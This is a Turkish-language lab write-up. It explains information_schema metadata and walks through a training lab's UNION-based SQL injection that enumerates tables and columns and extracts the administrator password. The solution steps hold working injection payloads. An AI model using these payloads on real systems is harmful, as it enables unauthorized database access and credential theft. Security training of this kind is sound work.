# SQL injection attack, listing the database contents on non-Oracle databases

## Konu Açıklaması (Listing Database Contents via information_schema)
Oracle haricindeki birçok ilişkisel veritabanında (MySQL, PostgreSQL, Microsoft SQL Server vb.) veritabanı şeması, tablolar ve kolonlar hakkındaki meta veriler `information_schema` adındaki özel bir şemada tutulur.

### 1. Tabloları Listeleme (`information_schema.tables`)
Veritabanında bulunan tabloları öğrenmek için:
```sql
SELECT table_name FROM information_schema.tables
```

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| --- | --- | --- | --- |
| MyDatabase | dbo | Products | BASE TABLE |
| MyDatabase | dbo | Users | BASE TABLE |
| MyDatabase | dbo | Feedback | BASE TABLE |

### 2. Sütunları Listeleme (`information_schema.columns`)
Belirli bir tablonun sütun isimlerini öğrenmek için:
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'Users'
```

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| --- | --- | --- | --- | --- |
| MyDatabase | dbo | Users | UserId | int |
| MyDatabase | dbo | Users | Username | varchar |
| MyDatabase | dbo | Users | Password | varchar |

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** SQL injection attack, listing the database contents on non-Oracle databases
- **Zafiyet Türü:** SQL Injection (Information Schema Enumeration)
- **Amaç:** `information_schema` yapısını kullanarak veritabanındaki rastgele isimlendirilmiş kullanıcı tablosunu ve sütunlarını tespit etmek, ardından `administrator` parolasını çekerek giriş yapmak.

### Çözüm Adımları
1. **İstekin Yakalanması ve Kolon/Tür Tespiti:**
   - Kategori filtreleme isteği Burp Repeater'a gönderilir.
   - Sorgunun 2 kolon döndürdüğü ve string veri desteklediği belirlenir.

2. **Tablo İsimlerinin Tespiti:**
   - `information_schema.tables` tablosundan tablo isimleri listelenir:
     ```sql
     ' UNION SELECT table_name, NULL FROM information_schema.tables --
     ```
   - Dönen tablolardan kullanıcı bilgilerini tutan tablo adı tespit edilir (örneğin: `users_fnmijf`).

3. **Sütun İsimlerinin Tespiti:**
   - Tespit edilen tablonun sütun isimleri sorgulanır:
     ```sql
     ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_fnmijf' --
     ```
   - Kullanıcı adı ve parola tutan kolon isimleri belirlenir (örneğin: `username_zzxzx_db` ve `password_rxzpsw`).

4. **Verilerin Sızdırılması:**
   - Elde edilen tablo ve sütun adları ile kimlik doğrulama verileri çekilir:
     ```sql
     ' UNION SELECT username_zzxzx_db, password_rxzpsw FROM users_fnmijf --
     ```
   - `administrator` hesabına ait parola elde edilir.

5. **Giriş ve Labın Tamamlanması:**
   - Login sayfasına gidilerek `administrator` hesabı ile giriş yapılır ve lab tamamlanır.
